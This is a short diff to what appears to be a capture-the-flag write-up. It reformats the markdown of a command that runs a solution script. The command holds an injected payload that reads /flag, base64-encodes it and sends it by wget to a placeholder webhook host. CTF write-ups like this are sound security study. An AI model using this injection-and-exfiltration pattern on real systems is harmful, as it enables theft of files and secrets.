@@ -22,4 +22,4 @@ print(f'Cookie: {response.headerlist[1][1]}')
 ```
 
 To get flag:
-`python3 solution-poems.py 'wget webhooklinkhere/?c=`/flag|base64`'`
+```python3 solution-poems.py 'wget webhooklinkhere/?c=`/flag|base64`'```
